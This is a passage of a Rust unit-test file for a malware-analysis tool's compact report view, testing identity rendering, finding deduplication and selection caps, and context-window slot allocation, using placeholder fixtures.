//! The LLM payload's render, ported with cleave's tiny-view tests when the
//! renderer moved here. Fixtures build reports by hand: each test reads as the
//! findings and windows a file carries, then asserts on what the grader sees.

use super::*;

use cleave::types::{ContextLine, Evidence, FindingKind, TargetInfo};

use super::identity::{identity_headline, render_identity};
use super::select::{
    CompositeSupport, allot, candidates, trait_family, withheld_composite_support,
};
use super::windows::{ascii_printable, expand_tabs, render_windows};

/// Identity fixture from JSON, so a test reads as the claims a file makes
/// rather than as struct assembly.
fn identity(json: serde_json::Value) -> filefacts::Identity {
    serde_json::from_value(json).expect("identity fixture")
}

/// The supplementary identity lines rendered for `id`.
fn identity_lines(id: &filefacts::Identity) -> String {
    let mut out = String::new();
    render_identity(&mut out, id);
    out
}

/// A located-anywhere capability finding at `crit`, its description the id.
fn finding_with(id: &str, crit: Criticality) -> Finding {
    Finding {
        kind: FindingKind::Capability,
        id: id.into(),
        desc: id.into(),
        conf: 0.9,
        crit,
        ..Default::default()
    }
}

/// A file as `FileAnalysis::new` builds one: a root member of nothing.
fn new_file(id: u32, path: &str, file_type: &str, sha256: &str, size: u64) -> FileAnalysis {
    FileAnalysis {
        id,
        path: path.to_string(),
        file_type: file_type.to_string(),
        sha256: sha256.to_string(),
        size,
        ..Default::default()
    }
}

/// An `elf` file carrying `findings` and nothing else.
fn file_with_findings(findings: Vec<Finding>) -> FileAnalysis {
    let mut fa = new_file(0, "/t", "elf", "sha", 1);
    fa.findings = findings;
    fa
}

/// A source (`python`) file with an explicit score, findings, and pre-built
/// context — the inputs the view ranks and renders from.
fn src_file(
    id: u32,
    path: &str,
    score: u32,
    findings: Vec<Finding>,
    context: Vec<Win>,
) -> FileAnalysis {
    let mut fa = new_file(id, path, "python", &format!("sha{id}"), 100);
    fa.score = score;
    fa.findings = findings;
    annotate(&mut fa, context);
    fa
}

/// A context window and the notes a test means it to carry.
struct Win {
    line: ContextLine,
    notes: Vec<Note>,
}

/// Append `context`'s windows to `fa`. Notes are derived from findings when
/// a report renders, so each intended note becomes a span (and the label)
/// of its finding, and a finding the test didn't supply is added from it.
fn annotate(fa: &mut FileAnalysis, context: Vec<Win>) {
    for Win { line, notes } in context {
        for n in notes {
            let at = fa
                .findings
                .iter()
                .position(|f| f.id == n.id)
                .unwrap_or_else(|| {
                    let mut f = Finding::new(
                        n.id.to_string(),
                        FindingKind::Capability,
                        n.desc.to_string(),
                        n.conf,
                    );
                    f.crit = n.crit;
                    fa.findings.push(f);
                    fa.findings.len() - 1
                });
            // One label per finding: a note's description replaces the
            // id-as-description placeholder `finding_with` gives a finding.
            let f = &mut fa.findings[at];
            if f.desc == f.id {
                f.desc = n.desc;
            }
            f.precomputed_spans
                .get_or_insert_with(Vec::new)
                .push([n.off, u64::from(n.len)]);
        }
        fa.context.push(line);
    }
}

/// Bytes reserved per test line, so windows on different lines never share
/// bytes (capture never emits overlapping windows).
const LINE_BYTES: u64 = 1000;

/// A single-line textual chunk at display line `line`, carrying an optional
/// note written with `off == line` meaning `data[0]` (ids and columns read
/// naturally; the bytes sit at `line * LINE_BYTES`).
fn ctx_line(line: u64, data: &str, note: Option<Note>) -> Win {
    let loc = line * LINE_BYTES;
    Win {
        line: ContextLine {
            loc,
            line: Some(line),
            col: Some(1),
            data: data.as_bytes().to_vec(),
        },
        notes: note
            .into_iter()
            .map(|n| Note {
                off: loc + n.off.saturating_sub(line),
                ..n
            })
            .collect(),
    }
}

/// A four-byte note for `id` at `loc`, described as `{id} desc`.
fn ctx_note(id: &str, crit: Criticality, loc: u64) -> Note {
    Note {
        crit,
        id: id.into(),
        desc: format!("{id} desc").into(),
        off: loc,
        len: 4,
        conf: 0.9,
    }
}

/// A report holding exactly `files`: the view reads `report.files` directly.
fn report_with_files(files: Vec<FileAnalysis>) -> AnalysisReport {
    let mut report = AnalysisReport::new(TargetInfo {
        path: "/test/sample.bin".to_string(),
        ..Default::default()
    });
    report.files = files;
    report
}

/// A finalized single-file report for `/test/sample.bin` holding `findings`,
/// as an analysis of a root file with no members produces one.
fn create_test_report(findings: Vec<Finding>) -> AnalysisReport {
    let mut report = AnalysisReport::new(TargetInfo {
        path: "/test/sample.bin".to_string(),
        file_type: "ELF".to_string(),
        size_bytes: 12345,
        sha256: "def456abc".to_string(),
        architectures: Some(vec!["x86_64".to_string()]),
    });
    report.findings = findings;
    report.finalize();
    report
}

/// A binary (`elf`) file with a score, findings, and pre-built byte context —
/// what the binary (printable-byte) view renders from.
fn bin_file(id: u32, score: u32, findings: Vec<Finding>, context: Vec<Win>) -> FileAnalysis {
    let mut fa = new_file(
        id,
        &format!("/mal{id}.bin"),
        "elf",
        &format!("sha{id}"),
        4096,
    );
    fa.score = score;
    fa.findings = findings;
    annotate(&mut fa, context);
    fa
}

/// A raw-byte context unit starting at byte offset `loc`, carrying `notes`
/// (each note's `off` is an absolute file offset). No `line`/`col` marks it a
/// binary byte unit rather than a textual chunk.
fn byte_unit(loc: u64, data: &[u8], notes: Vec<Note>) -> Win {
    Win {
        line: ContextLine {
            loc,
            line: None,
            col: None,
            data: data.to_vec(),
        },
        notes,
    }
}

/// A located note for `id` at line `line` with confidence `conf`.
fn story_line(line: u64, data: &str, id: &str, crit: Criticality, conf: f32) -> Win {
    let mut note = ctx_note(id, crit, line);
    note.conf = conf;
    ctx_line(line, data, Some(note))
}

/// Findings for every note in `context`, at the note's criticality and
/// confidence, followed by `extra`.
fn story_file(context: Vec<Win>, extra: Vec<Finding>) -> FileAnalysis {
    let mut findings: Vec<Finding> = context
        .iter()
        .flat_map(|l| &l.notes)
        .map(|n| Finding {
            conf: n.conf,
            ..finding_with(n.id.as_str(), n.crit)
        })
        .collect();
    findings.extend(extra);
    src_file(0, "agent.py", 50, findings, context)
}

/// The windows `render` draws for a lone `file`, under a budget of
/// `max_windows` windows and `budget` bytes in place of [`MAX_WINDOWS`] and
/// [`WINDOW_BYTES`]: the same selection, owed legs, relabeling and window
/// plan, with [`allot`] choosing among [`candidates`] once the file's windows
/// overspend, exactly as `window_plan` does at the module budgets. (The
/// leading-comment exemption is left out; no budgeted test draws one.)
fn render_budgeted(file: &FileAnalysis, max_windows: usize, budget: usize) -> String {
    let legs = evidence_legs(std::slice::from_ref(file));
    let owed: HashSet<&str> = legs.get(&file.id).into_iter().flatten().copied().collect();
    let mut selected = select_ids(file);
    for &id in legs.get(&file.id).into_iter().flatten() {
        if !selected.contains(&id) {
            selected.push(id);
        }
    }
    let notes = cleave::context::notes(&file.findings, &file.context);
    let notes = relabel_composite_notes(file, &notes, &selected).unwrap_or(notes);
    let mut plan = window_plan(file, &notes, &selected);
    let windows = plan.iter().filter(|w| w.ids.is_some()).count();
    let bytes: usize = plan
        .iter()
        .zip(&file.context)
        .filter(|(w, _)| w.ids.is_some())
        .map(|(_, line)| line.data.len())
        .sum();
    if windows > max_windows || bytes > budget {
        let sel: HashSet<&str> = selected.iter().copied().collect();
        let picked: HashSet<usize> = allot(candidates(file, &plan, &sel), max_windows, budget)
            .into_iter()
            .collect();
        for (i, w) in plan.iter_mut().enumerate() {
            if !picked.contains(&i) {
                w.ids = None;
            }
        }
    }
    let mut out = String::new();
    render_windows(&mut out, file, &plan, &owed);
    out
}

/// A file's leading comment window: offset 0, no notes.
fn leading_comment(text: &str) -> Win {
    Win {
        line: ContextLine {
            loc: 0,
            line: Some(1),
            col: Some(1),
            data: text.as_bytes().to_vec(),
        },
        notes: vec![],
    }
}

/// A one-finding source file whose window shows `code`.
fn hit_file(id: u32, path: &str, score: u32, code: &str) -> FileAnalysis {
    let tid = format!("cat/trait::n{id}");
    src_file(
        id,
        path,
        score,
        vec![finding_with(&tid, Criticality::Notable)],
        vec![ctx_line(
            9,
            code,
            Some(ctx_note(&tid, Criticality::Notable, 9)),
        )],
    )
}

// ---------------------------------------------------------------------------
// Identity
// ---------------------------------------------------------------------------

/// A package's self-description reaches the reader on its own line, cut to
/// fit, and is not repeated when it merely echoes the package name.
#[test]
fn package_description_renders_as_an_about_line() {
    let id = identity(serde_json::json!({
        "name": {"value": "@acme/cli-win32-x64", "source": "npm.name"},
        "identifier": {"value": "@acme/cli-win32-x64", "source": "npm.name"},
        "version": {"value": "5.6.1", "source": "npm.version"},
        "description": {
            "value": "Sandbox CLI core binary for Windows x64",
            "source": "npm.description",
        },
        "trust": "unsigned",
    }));
    let lines = identity_lines(&id);
    assert!(
        lines.contains("  about  \"Sandbox CLI core binary for Windows x64\"\n"),
        "{lines}"
    );

    let long = identity(serde_json::json!({
        "description": {"value": "x".repeat(150), "source": "whl.summary"},
        "trust": "unsigned",
    }));
    let lines = identity_lines(&long);
    assert!(
        lines.contains(&format!("about  \"{}…\"", "x".repeat(100))),
        "{lines}"
    );

    let echo = identity(serde_json::json!({
        "identifier": {"value": "left-pad", "source": "npm.name"},
        "description": {"value": "left-pad", "source": "npm.description"},
        "trust": "unsigned",
    }));
    assert!(!identity_lines(&echo).contains("about"));

    // A PE FileDescription that restates its ProductName adds nothing.
    let product = identity(serde_json::json!({
        "name": {"value": "tool.exe", "source": "pe.version.original_filename"},
        "project": {"value": "Acme Tool", "source": "pe.version.product_name"},
        "description": {"value": "acme tool", "source": "pe.version.description"},
        "trust": "unsigned",
    }));
    assert!(!identity_lines(&product).contains("about"));
}

/// A copyright notice becomes one claims token when it names someone other
/// than the company or signer, and is dropped when it only restates them.
#[test]
fn copyright_renders_only_when_it_names_a_different_holder() {
    let differs = identity(serde_json::json!({
        "name": {"value": "sandbox-cli.exe", "source": "pe.version.original_filename"},
        "organization": {"value": "Acme Ltd", "source": "pe.version.company"},
        "copyright": {
            "value": "Copyright (C) 2024 Tencent. All Rights Reserved. Licensed to example users",
            "source": "pe.version.copyright",
        },
        "trust": "unsigned",
    }));
    let lines = identity_lines(&differs);
    assert!(
        lines.contains(&format!(
            "copyright=\"{}…\"",
            "Copyright (C) 2024 Tencent. All Rights Reserved."
        )),
        "{lines}"
    );

    let restates = identity(serde_json::json!({
        "name": {"value": "msvcp140.dll", "source": "pe.version.original_filename"},
        "organization": {"value": "Microsoft Corporation", "source": "pe.signatures[0]"},
        "copyright": {
            "value": "© Microsoft Corporation. All rights reserved.",
            "source": "pe.version.copyright",
        },
        "trust": "platform",
    }));
    assert!(!identity_lines(&restates).contains("copyright"));

    let bare = identity(serde_json::json!({
        "name": {"value": "a.exe", "source": "pe.version.original_filename"},
        "copyright": {"value": "Copyright (C) 2024", "source": "pe.version.copyright"},
        "trust": "unsigned",
    }));
    assert!(!identity_lines(&bare).contains("copyright"));
}

/// A signed PE that claims one company in its version resource and carries
/// another on its Authenticode chain. The headline can only name one of
/// them; the disagreement is the signal, so both must reach the reader.
#[test]
fn pe_identity_shows_the_version_resource_beside_the_signature() {
    let id = identity(serde_json::json!({
        "name": {"value": "setup.exe", "source": "pe.version.original_filename"},
        "project": {"value": "Contoso Updater", "source": "pe.version.product_name"},
        "version": {"value": "3.5.1", "source": "pe.version.file_version"},
        "organization": {"value": "Contoso Ltd", "source": "pe.version.company_name"},
        "signer": {
            "common_name": "Vanguard Tech Limited",
            "organization": "Vanguard Tech Limited",
            "issuer": "DigiCert Trusted G4 Code Signing RSA4096",
            "signed_at": "2024-01-05T00:00:00Z",
            "source": "pe.signatures[0]",
        },
        "trust": "ca_signed",
        "build_path": {"value": "C:\\Users\\dev\\proj\\src\\main.rs", "source": "strings"},
    }));
    let headline = identity_headline(&id).expect("headline");
    let lines = identity_lines(&id);

    // The headline names the signer; the claims line names what the binary
    // says about itself, and the two disagree in plain sight.
    assert!(headline.contains("Vanguard Tech Limited"), "{headline}");
    assert!(lines.contains(r#"product="Contoso Updater""#), "{lines}");
    assert!(lines.contains(r#"company="Contoso Ltd""#), "{lines}");
    // The signer's own words, so the chain can be judged rather than trusted.
    assert!(lines.contains("issuer=\"DigiCert"), "{lines}");
    assert!(lines.contains("at=\"2024-01-05"), "{lines}");
    // The build path still reaches the reader.
    assert!(lines.contains(r"C:\Users\dev"), "{lines}");
    // Nothing the headline already showed is repeated.
    assert!(
        !lines.contains("O=\"Vanguard"),
        "signer org duplicated: {lines}"
    );
    assert!(
        !lines.contains("CN=\"Vanguard"),
        "signer name duplicated: {lines}"
    );
    assert!(
        !lines.contains(r#"file="setup.exe""#),
        "subject duplicated: {lines}"
    );
    assert!(
        !lines.contains(r#"version="3.5.1""#),
        "folded version duplicated: {lines}"
    );
}

/// A Mach-O keeps its team id and bundle version beside the signing
/// identity: a Developer ID whose team does not match the bundle it ships
/// is the same class of tell as the PE above.
#[test]
fn macho_identity_keeps_team_and_bundle_version() {
    let id = identity(serde_json::json!({
        "identifier": {"value": "com.contoso.helper", "source": "macho.bundle_identifier"},
        "version": {"value": "1.4.0", "source": "macho.bundle_version"},
        "team_id": {"value": "AB12CD34EF", "source": "macho.code_signature"},
        "signer": {
            "common_name": "Developer ID Application: Contoso Ltd (AB12CD34EF)",
            "organization": "Contoso Ltd",
            "source": "macho.code_signature",
        },
        "trust": "developer_id",
    }));
    let headline = identity_headline(&id).expect("headline");
    let lines = identity_lines(&id);
    assert!(headline.contains("com.contoso.helper"), "{headline}");
    assert!(headline.contains("developer-id"), "{headline}");
    // The identifier is the subject, so the version is *not* folded in and
    // must be carried here instead.
    assert!(lines.contains(r#"version="1.4.0""#), "{lines}");
    assert!(lines.contains(r#"team="AB12CD34EF""#), "{lines}");
    assert!(lines.contains("CN=\"Developer ID Application"), "{lines}");
}

/// An Office document names an author, a company and the application that
/// produced it. The headline shows two of the three; all three matter when
/// a document arrives from outside the company it claims.
#[test]
fn docx_identity_keeps_company_beside_author_and_producer() {
    let id = identity(serde_json::json!({
        "title": {"value": "Q3 Vendor Invoice", "source": "docprops.core.title"},
        "authors": [
            {"name": "Aleksandr Petrov", "email": "a.petrov@example.invalid",
             "role": "author", "source": "office.creator"},
            {"name": "Finance Bot", "role": "last_modified_by",
             "source": "docprops.core.lastModifiedBy"},
        ],
        "organization": {"value": "Contoso Ltd", "source": "docprops.app.company"},
        "producer": {"value": "Microsoft Office Word", "source": "docprops.app.application"},
        "trust": "unsigned",
    }));
    let headline = identity_headline(&id).expect("headline");
    let lines = identity_lines(&id);
    assert!(headline.contains("Q3 Vendor Invoice"), "{headline}");
    assert!(headline.contains("Aleksandr Petrov"), "{headline}");
    // The company the document claims — dropped from the headline because
    // an author outranked it — and the second party that touched it.
    assert!(lines.contains(r#"company="Contoso Ltd""#), "{lines}");
    assert!(lines.contains("Finance Bot"), "{lines}");
    assert!(lines.contains("(last_modified_by)"), "{lines}");
    // The author the headline already named is not repeated, but their
    // address — which the headline has no room for — is not lost either.
    assert!(!lines.contains("authors  Aleksandr Petrov,"), "{lines}");
    // Unsigned, so the producer is the headline's third slot: not repeated.
    assert!(!lines.contains(r#"producer="Microsoft"#), "{lines}");
}

/// A signed artifact shows its producing tool too: the headline spends its
/// third slot on the trust tier, so the tool would otherwise vanish.
#[test]
fn a_signed_artifact_still_names_its_producing_tool() {
    let id = identity(serde_json::json!({
        "title": {"value": "Quarterly Report", "source": "docprops.core.title"},
        "producer": {"value": "LibreOffice 7.6", "source": "docprops.app.application"},
        "signer": {"common_name": "Contoso Ltd", "source": "ooxml.signature"},
        "trust": "ca_signed",
    }));
    let headline = identity_headline(&id).expect("headline");
    assert!(headline.contains("ca-signed"), "{headline}");
    assert!(!headline.contains("LibreOffice"), "{headline}");
    assert!(
        identity_lines(&id).contains(r#"producer="LibreOffice 7.6""#),
        "{}",
        identity_lines(&id)
    );
}

/// The whole point is that this reaches the LLM view, which has no rich
/// header — only the minimal header plus these lines.
#[test]
fn tiny_view_carries_the_full_identity_block() {
    let mut file = src_file(
        0,
        "setup.exe",
        5,
        vec![finding_with("t/one", Criticality::Notable)],
        vec![ctx_line(
            1,
            "MZ",
            Some(ctx_note("t/one", Criticality::Notable, 1)),
        )],
    );
    file.file_type = "pe".to_string();
    file.identity = Some(identity(serde_json::json!({
        "name": {"value": "setup.exe", "source": "pe.version.original_filename"},
        "project": {"value": "Contoso Updater", "source": "pe.version.product_name"},
        "organization": {"value": "Contoso Ltd", "source": "pe.version.company_name"},
        "signer": {"organization": "Vanguard Tech Limited", "source": "pe.signatures[0]"},
        "trust": "ca_signed",
    })));
    let tiny = render(&report_with_files(vec![file]));
    assert!(tiny.contains("Vanguard Tech Limited"), "{tiny}");
    assert!(tiny.contains(r#"product="Contoso Updater""#), "{tiny}");
    assert!(tiny.contains(r#"company="Contoso Ltd""#), "{tiny}");
}

/// The view keeps the identity lines (claims, unique ids) for a file it
/// renders, but draws no location-less note, whatever its grade. (The plain
/// half of cleave's `terminal_view_trims_counts_claims_ids_and_locationless_notables`.)
#[test]
fn tiny_view_keeps_identity_lines_but_no_locationless_notes() {
    let mut file = src_file(
        0,
        "Installer",
        5,
        vec![
            finding_with("t/notable-note", Criticality::Notable),
            finding_with("t/suspicious-note", Criticality::Suspicious),
            finding_with("t/windowed", Criticality::Notable),
        ],
        vec![ctx_line(
            1,
            "WINDOWED_BYTES",
            Some(ctx_note("t/windowed", Criticality::Notable, 1)),
        )],
    );
    file.file_type = "macho".to_string();
    file.identity = Some(identity(serde_json::json!({
        "name": {"value": "authorization", "source": "macho.name"},
        "project": {"value": "Contoso Updater", "source": "macho.product"},
        "signer": {"organization": "Contoso Ltd", "source": "macho.signature"},
        "unique_ids": {"cdhash": "39aa9a55c001d58cdeadbeef"},
        "trust": "ad_hoc",
    })));
    let tiny = render(&report_with_files(vec![file]));
    assert!(tiny.contains("claims"), "{tiny}");
    assert!(tiny.contains("cdhash"), "{tiny}");
    assert!(tiny.contains("t/windowed"), "{tiny}");
    assert!(!tiny.contains("t/notable-note"), "{tiny}");
    assert!(!tiny.contains("t/suspicious-note"), "{tiny}");
}

// ---------------------------------------------------------------------------
// Dedup and selection
// ---------------------------------------------------------------------------

/// The machine view collapses a finding repeated across a sample's own
/// members — the same "no symbol table" across a hundred of them is noise.
/// A fetched dependency is not one of those members: it is a separate
/// artifact with its own author, and its firing the same finding is a second
/// independent occurrence. Because the root renders first, the copy that got
/// dropped was the dependency's — silently deleting a hostile finding from
/// the block of the artifact that actually carried it.
#[test]
fn dedup_does_not_cross_a_fetched_artifact_boundary() {
    let shared = "objectives/exec/install-hook";
    let mut root = src_file(
        0,
        "wrapper.tgz",
        5,
        vec![finding_with(shared, Criticality::Suspicious)],
        vec![],
    );
    root.depth = 0;

    // An ordinary member of the sample: its repeat is noise, still collapsed.
    let mut member = src_file(
        1,
        "wrapper.tgz!!lib/a.js",
        4,
        vec![finding_with(shared, Criticality::Suspicious)],
        vec![ctx_line(
            1,
            "install()",
            Some(ctx_note(shared, Criticality::Suspicious, 1)),
        )],
    );
    member.depth = 1;
    member.parent_id = Some(0);

    // A fetched dependency, and one of its own members.
    let mut dep = src_file(
        2,
        "pkg:npm/evil@1.0.0",
        4,
        vec![finding_with(shared, Criticality::Hostile)],
        vec![],
    );
    dep.depth = 1;
    dep.parent_id = Some(0);
    dep.rel = Rel::Fetched;
    let mut dep_member = src_file(
        3,
        "pkg:npm/evil@1.0.0!!index.js",
        3,
        vec![finding_with(shared, Criticality::Hostile)],
        vec![ctx_line(
            1,
            "install()",
            Some(ctx_note(shared, Criticality::Hostile, 1)),
        )],
    );
    dep_member.depth = 2;
    dep_member.parent_id = Some(2);

    let tiny = render(&report_with_files(vec![root, member, dep, dep_member]));

    // Containers collapse their findings into the member that carries them,
    // so the two blocks that render are the sample's member and the
    // dependency's. The criticality marker tells them apart: S is the
    // sample's copy, H the dependency's. Deduped across the boundary, the
    // sample renders first and H disappears entirely.
    assert!(
        tiny.contains("# H "),
        "the dependency's own finding was deduped away against the sample's: {tiny:?}",
    );
    assert_eq!(
        tiny.matches("# H ").count(),
        1,
        "dedup still collapses repeats inside the dependency: {tiny:?}",
    );
    assert_eq!(
        tiny.matches("# S ").count(),
        1,
        "dedup still collapses repeats inside the sample: {tiny:?}",
    );
}

/// Suspicious and hostile findings bypass [`TOP_N`] entirely: past the cap,
/// every one still shows.
#[test]
fn select_ids_always_shows_suspicious_and_hostile_past_cap() {
    let findings = (0..TOP_N + 10)
        .map(|i| finding_with(&format!("hostile-{i}"), Criticality::Hostile))
        .collect();
    let file = file_with_findings(findings);
    assert_eq!(
        select_ids(&file).len(),
        TOP_N + 10,
        "every hostile finding shows despite the cap"
    );
}

/// With more notable findings than [`TOP_N`] beside a few suspicious and
/// hostile ones, every high-crit one shows and the notable remainder fills
/// the rest of the cap.
#[test]
fn select_ids_caps_lower_crit_remainder_but_keeps_high() {
    let mut findings: Vec<Finding> = (0..TOP_N + 50)
        .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
        .collect();
    for i in 0..5 {
        findings.push(finding_with(&format!("sus-{i}"), Criticality::Suspicious));
    }
    for i in 0..3 {
        findings.push(finding_with(&format!("hostile-{i}"), Criticality::Hostile));
    }
    let file = file_with_findings(findings);
    let selected = select_ids(&file);
    assert_eq!(selected.len(), TOP_N, "total capped at TOP_N");
    for i in 0..5 {
        assert!(selected.contains(&format!("sus-{i}").as_str()));
    }
    for i in 0..3 {
        assert!(selected.contains(&format!("hostile-{i}").as_str()));
    }
    let notables = selected
        .iter()
        .filter(|id| id.starts_with("notable-"))
        .count();
    assert_eq!(
        notables,
        TOP_N - 8,
        "lower-crit remainder fills the rest of the cap"
    );
}

/// The LLM view casts a wide net — the top 250 — so the model sees far more
/// of the picture before the cap bites.
#[test]
fn tiny_view_widens_cap_to_250() {
    assert_eq!(TOP_N, 250);
    let findings = (0..300)
        .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
        .collect();
    let file = file_with_findings(findings);
    assert_eq!(select_ids(&file).len(), 250);
}

/// 5 notable + 20 low-tier with a fill of 15: all 5 notable stay, the 10
/// best low-tier top the selection up to exactly 15. A file already at or
/// over the fill with real signal takes no fill.
#[test]
fn low_tier_fill_tops_up_to_budget_without_evicting() {
    assert_eq!(LOW_TIER_FILL, 15);
    let mut findings: Vec<Finding> = (0..5)
        .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
        .collect();
    for i in 0..10 {
        findings.push(finding_with(&format!("comp-{i}"), Criticality::Component));
    }
    for i in 0..10 {
        findings.push(finding_with(&format!("base-{i}"), Criticality::Baseline));
    }
    let file = file_with_findings(findings);
    let selected = select_ids(&file);
    assert_eq!(selected.len(), 15, "fill tops up to the budget");
    for i in 0..5 {
        assert!(selected.contains(&format!("notable-{i}").as_str()));
    }
    // Baseline outranks Component (crit 2 vs 1), so at equal confidence the
    // 10 baselines win the fill slots.
    for i in 0..10 {
        assert!(selected.contains(&format!("base-{i}").as_str()));
    }

    let findings = (0..20)
        .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
        .collect();
    let file = file_with_findings(findings);
    assert_eq!(select_ids(&file).len(), 20);
}

/// The view shows evidence, not conclusions. A composite is cleave's own
/// verdict: withheld, with the legs it was built from promoted in its place
/// — even though those legs sit at Baseline/Component, tiers this view would
/// otherwise drop. A component the composite does not reference stays
/// dropped: promotion is for legs, not every fragment.
///
/// cleave isolated the rule with the low-tier fill off; here the fill is the
/// constant [`LOW_TIER_FILL`], which would let the unreferenced component back
/// in as filler, so the file carries enough notable findings to take none.
#[test]
fn select_ids_tiny_omits_composites_and_promotes_their_legs() {
    let mut composite = finding_with("objectives/loader::matched", Criticality::Suspicious);
    composite.trait_refs = vec![
        "micro-behaviors/fs/read::open".into(),
        "objectives/loader::fragment".into(),
    ];
    let mut findings: Vec<Finding> = (0..LOW_TIER_FILL)
        .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
        .collect();
    findings.extend([
        finding_with("micro-behaviors/fs/read::open", Criticality::Baseline),
        finding_with("objectives/loader::fragment", Criticality::Component),
        finding_with("objectives/loader::unused", Criticality::Component),
        composite,
    ]);
    let file = file_with_findings(findings);

    let tiny = select_ids(&file);
    assert!(
        !tiny.contains(&"objectives/loader::matched"),
        "the composite's conclusion must not reach the grader: {tiny:?}"
    );
    assert!(tiny.contains(&"micro-behaviors/fs/read::open"), "{tiny:?}");
    assert!(tiny.contains(&"objectives/loader::fragment"), "{tiny:?}");
    assert!(!tiny.contains(&"objectives/loader::unused"), "{tiny:?}");
}

/// A cross-file composite carries source provenance (`composite_sources`)
/// but is native to no member — it exists only on the container. Treating it
/// as an inherited copy dropped it from every rendered view. An ordinary
/// inherited copy is still rendered by its origin member, not here.
#[test]
fn select_ids_keeps_cross_file_composites_on_a_container() {
    let mut composite = finding_with("objectives/impact::launch", Criticality::Suspicious);
    composite.src = Some(7);
    let mut file = file_with_findings(vec![composite]);
    file.composite_sources.insert(
        "objectives/impact::launch".to_string(),
        serde_json::from_value(serde_json::json!([{"file": 7}])).expect("composite sources"),
    );
    let selected = select_ids(&file);
    assert!(
        selected.contains(&"objectives/impact::launch"),
        "{selected:?}"
    );

    let mut inherited = finding_with("objectives/impact::other", Criticality::Suspicious);
    inherited.src = Some(7);
    let plain = file_with_findings(vec![inherited]);
    let selected = select_ids(&plain);
    assert!(
        !selected.contains(&"objectives/impact::other"),
        "{selected:?}"
    );
}

/// A benign file with only low-tier traits shows its top traits: an empty
/// payload tells the grader nothing. (The plain half of cleave's
/// `undetected_file_renders_low_tier_in_tiny_but_not_terminal`.)
#[test]
fn undetected_file_renders_low_tier_in_tiny() {
    let comp = finding_with("micro/fs::readdir", Criticality::Component);
    let base = finding_with("meta/build::debuglink", Criticality::Baseline);
    let file = src_file(
        0,
        "/bin/fake",
        1,
        vec![comp, base],
        vec![
            ctx_line(
                1,
                "readdir(dirp);",
                Some(ctx_note("micro/fs::readdir", Criticality::Component, 1)),
            ),
            ctx_line(
                2,
                "debuglink(section);",
                Some(ctx_note("meta/build::debuglink", Criticality::Baseline, 2)),
            ),
        ],
    );
    let tiny = render(&report_with_files(vec![file]));
    assert!(
        tiny.contains("readdir(dirp);"),
        "the view surfaces low-tier context, got: {tiny:?}"
    );
    assert!(
        tiny.contains("debuglink(section);"),
        "baseline context surfaces too, got: {tiny:?}"
    );
}

// ---------------------------------------------------------------------------
// Context slots
// ---------------------------------------------------------------------------

/// Six source files, descending score. The top five draw their source
/// context; the sixth is past the cap, so it renders nothing at all: an
/// annotation without its code is noise.
#[test]
fn tiny_caps_context_to_top_five_scoring_files() {
    assert_eq!(MAX_CONTEXT_FILES, 5);
    let files: Vec<FileAnalysis> = (0..6)
        .map(|i| {
            let id = format!("cat/trait::n{i}");
            let note = ctx_note(&id, Criticality::Notable, 1);
            src_file(
                i,
                &format!("/f{i}.py"),
                100 - i, // strictly descending: f0 highest, f5 lowest
                vec![Finding {
                    desc: format!("finding desc {i}").into(),
                    ..finding_with(&id, Criticality::Notable)
                }],
                vec![ctx_line(
                    1,
                    &format!("CODELINE_{i} = real_work()"),
                    Some(note),
                )],
            )
        })
        .collect();
    let output = render(&report_with_files(files));

    for i in 0..5 {
        assert!(
            output.contains(&format!("CODELINE_{i}")),
            "file {i} (top-5) should show context\n{output}"
        );
    }
    assert!(
        !output.contains("CODELINE_5"),
        "file 5 is past the context cap; no window\n{output}"
    );
    assert!(
        !output.contains("finding desc 5") && !output.contains("f5.py"),
        "file 5 is past the cap and must not render\n{output}"
    );
}

/// A file with no captured window cannot show code, so it never takes one of
/// the five slots; a file carrying a suspicious composite's evidence outranks
/// a higher-scored file that carries none.
#[test]
fn tiny_context_slots_go_to_windowed_files_evidence_first() {
    let windowed = |i: u32, score: u32| {
        let id = format!("cat/trait::n{i}");
        let note = ctx_note(&id, Criticality::Notable, 1);
        src_file(
            i,
            &format!("/f{i}.py"),
            score,
            vec![finding_with(&id, Criticality::Notable)],
            vec![ctx_line(
                1,
                &format!("CODELINE_{i} = real_work()"),
                Some(note),
            )],
        )
    };
    // Top score, but nothing to draw.
    let bare = src_file(
        0,
        "/bare.py",
        1000,
        vec![Finding {
            desc: "bare finding".into(),
            ..finding_with("cat/trait::bare", Criticality::Notable)
        }],
        vec![],
    );
    let mut files: Vec<FileAnalysis> = vec![bare];
    files.extend((1..6).map(|i| windowed(i, 100 - i)));
    // Lowest score, but it holds a suspicious composite's leg.
    let leg = "cat/trait::leg";
    let mut composite = finding_with("objectives/exec::chain", Criticality::Suspicious);
    composite.trait_refs = vec![leg.into()];
    let note = ctx_note(leg, Criticality::Notable, 1);
    files.push(src_file(
        6,
        "/legs.py",
        1,
        vec![composite, finding_with(leg, Criticality::Notable)],
        vec![ctx_line(1, "LEGLINE = run()", Some(note))],
    ));
    let output = render(&report_with_files(files));

    assert!(!output.contains("bare"), "{output}");
    assert!(output.contains("LEGLINE"), "{output}");
    for i in 1..5 {
        assert!(output.contains(&format!("CODELINE_{i}")), "{output}");
    }
    assert!(!output.contains("CODELINE_5"), "{output}");
}

/// An installer's hook script takes a slot ahead of five payload files that
/// outscore it.
#[test]
fn tiny_context_slots_put_installer_hooks_before_higher_scored_payload() {
    let mut files: Vec<FileAnalysis> = (1..=5)
        .map(|i| {
            hit_file(
                i,
                &format!("/pkg/Payload/lib{i}.py"),
                100 - i,
                &format!("CODELINE_{i} = 1"),
            )
        })
        .collect();
    files.push(hit_file(
        6,
        "/pkg.pkg!!Scripts!!postinstall",
        3,
        "HOOKLINE = launchctl()",
    ));
    let output = render(&report_with_files(files));
    assert!(output.contains("HOOKLINE"), "{output}");
    assert!(
        !output.contains("CODELINE_5"),
        "the lowest payload file yields its slot\n{output}"
    );
}

/// A package's per-architecture builds of one program differ in SHA-256 but
/// show the same code, so they share one slot: the higher-scored build's.
#[test]
fn tiny_context_slots_take_one_build_of_a_same_named_executable() {
    let exe = |id: u32, path: &str, score: u32| {
        let mut f = bin_file(id, score, vec![], vec![]);
        f.path = path.to_string();
        f.file_type = "macho".to_string();
        f
    };
    let mut x64 = exe(1, "/seed/x64/zalocli", 100);
